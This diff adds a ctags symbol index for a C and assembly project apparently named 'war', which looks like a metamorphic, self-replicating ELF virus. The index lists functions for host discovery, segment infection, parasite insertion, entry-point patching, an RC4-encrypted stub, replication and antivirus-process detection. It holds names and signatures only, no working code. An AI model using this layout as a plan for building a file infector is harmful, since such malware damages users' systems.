@@ -1,0 +1,195 @@
+!_TAG_FILE_FORMAT	2	/extended format; --format=1 will not append ;" to lines/
+!_TAG_FILE_SORTED	1	/0=unsorted, 1=sorted, 2=foldcase/
+!_TAG_PROGRAM_AUTHOR	Darren Hiebert	/dhiebert@users.sourceforge.net/
+!_TAG_PROGRAM_NAME	Exuberant Ctags	//
+!_TAG_PROGRAM_URL	http://ctags.sourceforge.net	/official site/
+!_TAG_PROGRAM_VERSION	5.9~svn20110310	//
+ABORT	inc/war.h	/^	ABORT,$/;"	e	enum:e_context
+AS	Makefile	/^AS			= nasm$/;"	m
+ASFLAGS	Makefile	/^ASFLAGS			= -f elf64$/;"	m
+BUFF_SIZE	inc/war.h	35;"	d
+CC	Makefile	/^CC			= gcc$/;"	m
+CFLAGS	Makefile	/^CFLAGS			= -Wall -Wextra -Werror -masm=intel -D LOGGER -I $(INC_PATH)$/;"	m
+CODE_SIZE	inc/war.h	39;"	d
+CONTEXT_SIZE	inc/war.h	/^	CONTEXT_SIZE,$/;"	e	enum:e_context
+DATA	inc/war.h	/^	DATA,$/;"	e	enum:e_segment
+ELF_MAGIC_NUMBER	inc/war.h	32;"	d
+ENTRY_LOGGER	inc/logger.h	8;"	d
+ENTRY_SIZE	inc/war.h	/^	ENTRY_SIZE,$/;"	e	enum:e_entry
+EXIT_LOGGER	inc/logger.h	42;"	d
+FAILURE	inc/war.h	/^	FAILURE,$/;"	e	enum:e_context
+FCNT_SIZE	inc/war.h	38;"	d
+INC_PATH	Makefile	/^INC_PATH		= inc$/;"	m
+JUMP_SIZE	inc/war.h	36;"	d
+KEY_SIZE	inc/war.h	/^	KEY_SIZE,$/;"	e	enum:e_key
+L1	src/asm/stub.s	/^L1:$/;"	l
+L2	src/asm/stub.s	/^L2:$/;"	l
+L3	src/asm/stub.s	/^L3:$/;"	l
+LEFT	inc/war.h	/^	LEFT,$/;"	e	enum:e_key
+LOGGER_H	inc/logger.h	2;"	d
+MID_LOGGER	inc/logger.h	27;"	d
+NAME	Makefile	/^NAME			= war$/;"	m
+NEW	inc/war.h	/^	NEW,$/;"	e	enum:e_entry
+NOTE	inc/war.h	/^	NOTE,$/;"	e	enum:e_segment
+OBJ	Makefile	/^OBJ			= $(addprefix $(OBJ_PATH_C)\/,$(OBJ_NAME_PRELOAD))	\\$/;"	m
+OBJ_NAME_ENTRY	Makefile	/^OBJ_NAME_ENTRY		= __entry.o						\\$/;"	m
+OBJ_NAME_EXIT	Makefile	/^OBJ_NAME_EXIT		= __exit.o						\\$/;"	m
+OBJ_NAME_LIB_C	Makefile	/^OBJ_NAME_LIB_C		= syscall.o						\\$/;"	m
+OBJ_NAME_LIB_S	Makefile	/^OBJ_NAME_LIB_S		= stub.o						\\$/;"	m
+OBJ_NAME_PRELOAD	Makefile	/^OBJ_NAME_PRELOAD	= preload.o						\\$/;"	m
+OBJ_NAME_WAR	Makefile	/^OBJ_NAME_WAR		= antivirus.o						\\$/;"	m
+OBJ_PATH_C	Makefile	/^OBJ_PATH_C		= obj\/c$/;"	m
+OBJ_PATH_S	Makefile	/^OBJ_PATH_S		= obj\/asm$/;"	m
+OFFSET_1	inc/war.h	51;"	d
+OFFSET_2	inc/war.h	52;"	d
+OFFSET_3	inc/war.h	53;"	d
+OFFSET_4	inc/war.h	54;"	d
+OFFSET_5	inc/war.h	55;"	d
+OFFSET_6	inc/war.h	56;"	d
+OFFSET_7	inc/war.h	57;"	d
+OFFSET_8	inc/war.h	58;"	d
+OFFSET_9	inc/war.h	59;"	d
+OFFSET_SIZE	inc/war.h	40;"	d
+OLD	inc/war.h	/^	OLD,$/;"	e	enum:e_entry
+PAGE_SIZE	inc/war.h	37;"	d
+PARASITE_OFFSET	inc/war.h	44;"	d
+PARASITE_SIZE_OFFSET	inc/war.h	45;"	d
+PWN_MAGIC_NUMBER	inc/war.h	33;"	d
+R1	src/asm/rc4.s	/^R1:$/;"	l
+R1	src/asm/stub.s	/^R1:$/;"	l
+R2	src/asm/rc4.s	/^R2:$/;"	l
+R2	src/asm/stub.s	/^R2:$/;"	l
+R3	src/asm/rc4.s	/^R3:$/;"	l
+R3	src/asm/stub.s	/^R3:$/;"	l
+R4	src/asm/rc4.s	/^R4:$/;"	l
+R4	src/asm/stub.s	/^R4:$/;"	l
+RAX	inc/war.h	64;"	d
+RBP	inc/war.h	61;"	d
+RBX	inc/war.h	63;"	d
+RC4	src/asm/rc4.s	/^RC4:$/;"	l
+RC4	src/asm/stub.s	/^RC4:$/;"	l
+RCX	inc/war.h	68;"	d
+RDI	inc/war.h	65;"	d
+RDX	inc/war.h	67;"	d
+RIGHT	inc/war.h	/^	RIGHT,$/;"	e	enum:e_key
+RSI	inc/war.h	66;"	d
+RSP	inc/war.h	62;"	d
+SEGMENT_SIZE	inc/war.h	/^	SEGMENT_SIZE,$/;"	e	enum:e_segment
+SIGNATURE_SIZE	inc/war.h	49;"	d
+SRC_PATH_C	Makefile	/^SRC_PATH_C		= src\/c$/;"	m
+SRC_PATH_S	Makefile	/^SRC_PATH_S		= src\/asm$/;"	m
+STUB_OFFSET	inc/war.h	42;"	d
+STUB_SIZE_OFFSET	inc/war.h	43;"	d
+SUCCESS	inc/war.h	/^	SUCCESS,$/;"	e	enum:e_context
+TARGET	inc/war.h	47;"	d
+TEXT	inc/war.h	/^	TEXT,$/;"	e	enum:e_segment
+WAR_H	inc/war.h	2;"	d
+_GNU_SOURCE	inc/war.h	3;"	d
+__entry	src/c/__entry.c	/^void __entry(void)$/;"	f
+__exit	src/c/__exit.c	/^void __exit(void)$/;"	f
+_bzero	src/c/tools.c	/^void _bzero(char *str, const size_t size)$/;"	f
+_close	src/c/syscall.c	/^int _close(int fd)$/;"	f
+_execve	src/c/syscall.c	/^int _execve(const char *filename, char *const argv[], char *const envp[])$/;"	f
+_fatal	src/c/syscall.c	/^void _fatal(void)$/;"	f
+_fork	src/c/syscall.c	/^pid_t _fork(void)$/;"	f
+_get_random_integer	src/c/tools.c	/^size_t _get_random_integer(const size_t range)$/;"	f
+_getdents64	src/c/syscall.c	/^int _getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count)$/;"	f
+_getrandom	src/c/syscall.c	/^ssize_t _getrandom(void *buf, size_t buflen, unsigned int flags)$/;"	f
+_getuid	src/c/syscall.c	/^uid_t _getuid(void)$/;"	f
+_memcpy	src/c/tools.c	/^void _memcpy(void *dst, void const *src, const size_t size)$/;"	f
+_mmap	src/c/syscall.c	/^void *_mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset)$/;"	f
+_munmap	src/c/syscall.c	/^int _munmap(void *addr, size_t length)$/;"	f
+_open	src/c/syscall.c	/^int _open(const char *pathname, int flags, mode_t mode)$/;"	f
+_read	src/c/syscall.c	/^ssize_t _read(int fd, void *buf, size_t count)$/;"	f
+_stat	src/c/syscall.c	/^int _stat(const char *filename, struct stat *statbuf)$/;"	f
+_strlen	src/c/tools.c	/^size_t _strlen(const char *str)$/;"	f
+_strncmp	src/c/tools.c	/^int _strncmp(const char *s1, const char *s2, size_t n)$/;"	f
+_wait4	src/c/syscall.c	/^pid_t _wait4(pid_t pid, int *wstatus, int options, struct rusage *rusage)$/;"	f
+_write	src/c/syscall.c	/^ssize_t _write(int fd, const void *buf, size_t count)$/;"	f
+antivirus	src/c/antivirus.c	/^void antivirus(struct s_host *host, struct s_keychain *keychain, enum e_context context)$/;"	f
+autodestruction	src/c/autodestruction.c	/^void autodestruction(struct s_host *host, struct s_keychain *keychain, enum e_context context)$/;"	f
+clean	src/c/clean.c	/^void clean(struct s_host *host, struct s_keychain *keychain, enum e_context context, struct s_infect *infect)$/;"	f
+code	inc/war.h	/^	unsigned short code[CODE_SIZE];$/;"	m	struct:s_metamorph
+criteria	src/c/criteria.c	/^void criteria(struct s_host *host, struct s_keychain *keychain, enum e_context context)$/;"	f
+d_ino	inc/war.h	/^	uint64_t d_ino;$/;"	m	struct:linux_dirent64
+d_name	inc/war.h	/^	char d_name[];$/;"	m	struct:linux_dirent64
+d_off	inc/war.h	/^	int64_t d_off;$/;"	m	struct:linux_dirent64
+d_reclen	inc/war.h	/^	unsigned short d_reclen;$/;"	m	struct:linux_dirent64
+d_type	inc/war.h	/^	unsigned char d_type;$/;"	m	struct:linux_dirent64
+debug	run.sh	/^function debug()$/;"	f
+decrypt_left	src/c/keychain.c	/^void decrypt_left(const struct s_keychain *keychain, char *callee, const size_t size)$/;"	f
+decrypt_right	src/c/keychain.c	/^void decrypt_right(const struct s_keychain *keychain, char *callee, const size_t size)$/;"	f
+e_context	inc/war.h	/^enum e_context$/;"	g
+e_entry	inc/war.h	/^enum e_entry$/;"	g
+e_key	inc/war.h	/^enum e_key$/;"	g
+e_segment	inc/war.h	/^enum e_segment$/;"	g
+entry	inc/war.h	/^	Elf64_Addr entry[ENTRY_SIZE];$/;"	m	struct:s_host
+entry	inc/war.h	/^	ssize_t entry;$/;"	m	struct:s_directory
+execution	src/c/execution.c	/^void execution(const struct s_host *host, const struct s_keychain *keychain, const enum e_context context)$/;"	f
+fd	inc/war.h	/^	int fd;$/;"	m	struct:s_infect
+filename	inc/war.h	/^	char *filename;$/;"	m	struct:s_host
+filesize	inc/war.h	/^	size_t filesize;$/;"	m	struct:s_host
+filesize	inc/war.h	/^	size_t filesize;$/;"	m	struct:s_infect
+find_host	src/c/find.c	/^void find_host(struct s_host *host, struct s_keychain *keychain, void *dir, const size_t size, enum e_context context)$/;"	f
+generate_signature	src/c/sign.c	/^__attribute__((always_inline)) static inline void generate_signature(unsigned char *signature)$/;"	f	file:
+get_entry	src/c/find.c	/^__attribute__((always_inline)) static inline ssize_t get_entry(const char *path)$/;"	f	file:
+get_filename	src/c/find.c	/^__attribute__((always_inline)) static inline char *get_filename(const char *path, const ssize_t entry)$/;"	f	file:
+get_segment	src/c/note.c	/^__attribute__((always_inline)) static inline Elf64_Phdr *get_segment(const struct s_host *host, const size_t index)$/;"	f	file:
+get_segment	src/c/text.c	/^__attribute__((always_inline)) static inline Elf64_Phdr *get_segment(const struct s_host *host, const size_t index)$/;"	f	file:
+global	src/asm/rc4.s	/^global RC4$/;"	l
+global	src/asm/stub.s	/^global L1$/;"	l
+global	src/asm/stub.s	/^global RC4$/;"	l
+header	inc/war.h	/^	Elf64_Ehdr *header;$/;"	m	struct:s_host
+header_infection	src/c/header.c	/^void header_infection(struct s_host *host, struct s_keychain *keychain, enum e_context context)$/;"	f
+host_constructor	src/c/host.c	/^void host_constructor(struct s_host *host, struct s_keychain *keychain, char *filename, enum e_context context)$/;"	f
+injection	src/c/injection.c	/^void injection(struct s_host *host, struct s_keychain *keychain, enum e_context context)$/;"	f
+insert_parasite	src/c/parasite.c	/^__attribute__((always_inline)) static inline void insert_parasite(char *dst, Elf64_Phdr **segment)$/;"	f	file:
+insert_stub	src/c/stub.c	/^__attribute__((always_inline)) static inline void insert_stub(char *dst, Elf64_Phdr **segment)$/;"	f	file:
+is_64	src/c/criteria.c	/^__attribute__((always_inline)) static inline bool is_64(const struct s_host *host)$/;"	f	file:
+is_antivirus	src/c/antivirus.c	/^__attribute__((always_inline)) static inline bool is_antivirus(const char *path, const char *target)$/;"	f	file:
+is_corrupted	src/c/criteria.c	/^__attribute__((always_inline)) static inline bool is_corrupted(const struct s_host *host)$/;"	f	file:
+is_data_segment	src/c/note.c	/^__attribute__((always_inline)) static inline bool is_data_segment(const Elf64_Phdr *segment)$/;"	f	file:
+is_elf	src/c/criteria.c	/^__attribute__((always_inline)) static inline bool is_elf(const struct s_host *host)$/;"	f	file:
+is_executable	src/c/criteria.c	/^__attribute__((always_inline)) static inline bool is_executable(const struct s_host *host)$/;"	f	file:
+is_infected	src/c/criteria.c	/^__attribute__((always_inline)) static inline bool is_infected(const struct s_host *host)$/;"	f	file:
+is_note_segment	src/c/note.c	/^__attribute__((always_inline)) static inline bool is_note_segment(const Elf64_Phdr *segment)$/;"	f	file:
+is_pid	src/c/antivirus.c	/^__attribute__((always_inline)) static inline bool is_pid(const char *str)$/;"	f	file:
+is_text_segment	src/c/text.c	/^__attribute__((always_inline)) static inline bool is_text_segment(const Elf64_Phdr *segment)$/;"	f	file:
+is_x86	src/c/criteria.c	/^__attribute__((always_inline)) static inline bool is_x86(const struct s_host *host)$/;"	f	file:
+junk	inc/war.h	/^	size_t junk[KEY_SIZE][KEY_SIZE];$/;"	m	struct:s_keychain
+key	inc/war.h	/^	int key[KEY_SIZE];$/;"	m	struct:s_keychain
+linux_dirent64	inc/war.h	/^struct linux_dirent64$/;"	s
+main	src/c/main.c	/^int main(void)$/;"	f
+metamorph_stub	src/c/stub.c	/^__attribute__((always_inline)) static inline void metamorph_stub(void)$/;"	f	file:
+note_infection	src/c/note.c	/^void note_infection(struct s_host *host, struct s_keychain *keychain, enum e_context context)$/;"	f
+offset	inc/war.h	/^	unsigned int offset[OFFSET_SIZE];$/;"	m	struct:s_metamorph
+parasite	src/c/parasite.c	/^void parasite(struct s_host *host, struct s_keychain *keychain, enum e_context context, struct s_infect *infect)$/;"	f
+patch_entry_point	src/c/parasite.c	/^__attribute__((always_inline)) static inline void patch_entry_point(char *dst, const struct s_host *host)$/;"	f	file:
+patch_stub	src/c/stub.c	/^__attribute__((always_inline)) static inline void patch_stub(Elf64_Phdr **segment)$/;"	f	file:
+path	inc/war.h	/^	char path[PATH_MAX];$/;"	m	struct:s_directory
+preload	src/c/preload.c	/^void preload(void)$/;"	f
+ptr	inc/war.h	/^	char *ptr;$/;"	m	struct:s_infect
+real	run.sh	/^function real()$/;"	f
+replicate	src/c/replicate.c	/^void replicate(struct s_host *host, struct s_keychain *keychain, enum e_context context)$/;"	f
+rsp	inc/war.h	/^	void *rsp;$/;"	m	struct:s_host
+s_directory	inc/war.h	/^struct s_directory$/;"	s
+s_host	inc/war.h	/^struct s_host$/;"	s
+s_infect	inc/war.h	/^struct s_infect$/;"	s
+s_keychain	inc/war.h	/^struct s_keychain$/;"	s
+s_metamorph	inc/war.h	/^struct s_metamorph$/;"	s
+section	src/asm/rc4.s	/^section .text$/;"	l
+section	src/asm/stub.s	/^section .text$/;"	l
+segment	inc/war.h	/^	Elf64_Phdr *segment[SEGMENT_SIZE];$/;"	m	struct:s_host
+sign	src/c/sign.c	/^void sign(struct s_host *host, struct s_keychain *keychain, enum e_context context, struct s_infect *infect)$/;"	f
+sign_infection	src/c/sign.c	/^__attribute__((always_inline)) static inline void sign_infection(char *dst, const Elf64_Phdr *segment, const unsigned char *signature)$/;"	f	file:
+stub	src/c/stub.c	/^void stub(struct s_host *host, struct s_keychain *keychain, enum e_context context, struct s_infect *infect)$/;"	f
+text_infection	src/c/text.c	/^void text_infection(struct s_host *host, struct s_keychain *keychain, enum e_context context)$/;"	f
+update_keychain_left	src/c/keychain.c	/^void update_keychain_left(struct s_keychain *keychain, const char *caller, const size_t size)$/;"	f
+update_keychain_right	src/c/keychain.c	/^void update_keychain_right(struct s_keychain *keychain, const char *caller, const size_t size)$/;"	f
+update_note_segment	src/c/note.c	/^__attribute__((always_inline)) static inline void update_note_segment(Elf64_Phdr **segment) $/;"	f	file:
+update_path	src/c/antivirus.c	/^__attribute__((always_inline)) static inline void update_path(char *path, const char *filename, const size_t path_size)$/;"	f	file:
+update_path	src/c/find.c	/^__attribute__((always_inline)) static inline void update_path(char *path, const char *filename)$/;"	f	file:
+update_text_segment	src/c/text.c	/^__attribute__((always_inline)) static inline void update_text_segment(Elf64_Phdr *segment)$/;"	f	file:
+usage	run.sh	/^function usage()$/;"	f
+war	src/c/war.c	/^void war(struct s_host *host, struct s_keychain *keychain, enum e_context context)$/;"	f
+write_on_memory	src/c/injection.c	/^__attribute__((always_inline)) static inline void write_on_memory(char *dst, char *src, Elf64_Phdr **segment)$/;"	f	file:
